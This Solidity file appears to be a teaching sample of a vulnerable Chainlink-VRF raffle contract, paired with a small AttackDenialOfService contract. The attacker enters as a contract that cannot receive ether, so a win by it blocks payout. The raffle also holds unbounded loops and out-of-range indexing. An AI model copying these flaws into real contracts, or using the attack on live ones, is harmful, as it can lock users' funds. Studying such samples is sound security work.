// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
import {VRFCoordinatorV2Interface} from "@chainlink/contracts/src/v0.8/vrf/interfaces/VRFCoordinatorV2Interface.sol";
import {VRFConsumerBaseV2} from "@chainlink/contracts/src/v0.8/vrf/VRFConsumerBaseV2.sol";

contract DenialOfService is VRFConsumerBaseV2, Ownable {
    error DenialOfService_UnableToRejoin();
    error DenialOfService_NotEnoughFee(uint fee);
    error DenialOfService_SendingEtherError();
    error DenialOfService_RaffleNotOpen();
    error DenialOfService_NotTheWinner(address winner);
    error DenialOfService_NotEnoughParticipants(address[] currentParticipants);
    error DenialOfService_DontHaveWinner();

    address[] private s_participants;
    uint private s_participantFee;
    bool private s_isRaffleOpen;
    address private s_recentWinner;

    // Chainlink VRF
    uint64 s_subscriptionId;
    address s_owner;
    VRFCoordinatorV2Interface COORDINATOR;
    address vrfCoordinator;

    // This key hash for Sepolia testnet
    bytes32 s_keyHash =
        0x474e34a077df58807dbe9c96d3c009b23b3c6d0cce433e59bbf5b34f823bc56c;
    uint32 callbackGasLimit = 100000;
    uint16 requestConfirmations = 3;
    uint32 numWords = 1;

    constructor(
        address _owner,
        address _vrfCoordinator,
        uint64 _subscriptionId
    ) Ownable(_owner) VRFConsumerBaseV2(_vrfCoordinator) {
        COORDINATOR = VRFCoordinatorV2Interface(_vrfCoordinator);
        s_owner = _owner;
        s_subscriptionId = _subscriptionId;
        s_isRaffleOpen = true;
    }

    event NewParticipantsEntered(address[] participants);
    event NewParticipantEntered(address participant);
    event LookingForAWinner(uint256 requestId);
    event GetTheWinner(uint256 requestId, address winner);
    event WinnerPrizeClaimed(address winner, uint256 prize);
    event SentPrizeToWinner(address winner, uint256 prize);

    function setFee(uint _fee) public onlyOwner {
        s_participantFee = _fee;
    }

    function enterRaffle(address[] memory newParticipants) public payable {
        if (msg.value != s_participantFee * newParticipants.length) {
            revert DenialOfService_NotEnoughFee(
                s_participantFee * newParticipants.length
            );
        }

        for (uint256 i; i < s_participants.length; i++) {
            if (s_participants[i] == newParticipants[i]) {
                revert DenialOfService_UnableToRejoin();
            }
        }

        for (uint256 i; i < newParticipants.length; i++) {
            s_participants.push(newParticipants[i]);
        }

        emit NewParticipantsEntered(newParticipants);
    }

    function enterRaffleSingle(address newParticipant) public payable {
        if (msg.value != s_participantFee) {
            revert DenialOfService_NotEnoughFee(s_participantFee);
        }

        for (uint256 i; i < s_participants.length; i++) {
            if (s_participants[i] == newParticipant) {
                revert DenialOfService_UnableToRejoin();
            }
        }

        s_participants.push(newParticipant);

        emit NewParticipantEntered(newParticipant);
    }

    function getWinner() public onlyOwner returns (uint256 requestId) {
        if (s_participants.length < 10) {
            revert DenialOfService_NotEnoughParticipants(s_participants);
        }

        requestId = COORDINATOR.requestRandomWords(
            s_keyHash,
            s_subscriptionId,
            requestConfirmations,
            callbackGasLimit,
            numWords
        );

        s_isRaffleOpen = false;

        emit LookingForAWinner(requestId);
    }

    function fulfillRandomWords(
        uint256 requestId,
        uint256[] memory randomWords
    ) internal override {
        if (s_isRaffleOpen) {
            revert DenialOfService_RaffleNotOpen();
        }
        uint256 randomValue = (randomWords[0] % s_participants.length) + 1;
        address winner = s_participants[randomValue];

        s_recentWinner = winner;

        emit GetTheWinner(requestId, winner);
    }

    function claimPrize() public {
        address winner = s_recentWinner;
        if (winner != msg.sender) {
            revert DenialOfService_NotTheWinner(s_recentWinner);
        }

        uint256 prize = s_participants.length * s_participantFee;

        delete s_participants;
        delete s_recentWinner;
        s_isRaffleOpen = true;

        (bool sent, ) = winner.call{value: prize}("");

        if (!sent) {
            revert DenialOfService_SendingEtherError();
        }

        emit WinnerPrizeClaimed(winner, prize);
    }

    function sentPrizeToWinner() public onlyOwner {
        if (s_recentWinner == address(0)) {
            revert DenialOfService_DontHaveWinner();
        }

        uint256 prize = s_participants.length * s_participantFee;

        address winner = s_recentWinner;

        delete s_participants;
        delete s_recentWinner;
        s_isRaffleOpen = true;

        (bool sent, ) = winner.call{value: prize}("");

        if (!sent) {
            revert DenialOfService_SendingEtherError();
        }

        emit SentPrizeToWinner(winner, prize);
    }

    function getParticipantFee() public view returns (uint) {
        return s_participantFee;
    }

    function getRecentWinner() public view returns (address) {
        return s_recentWinner;
    }
}

contract AttackDenialOfService {
    DenialOfService immutable i_target;

    constructor(address _target) {
        i_target = DenialOfService(_target);
    }

    function deposit() public payable {}

    function attack() public {
        uint fee = i_target.getParticipantFee();
        i_target.enterRaffleSingle{value: fee}(address(this));
    }
}
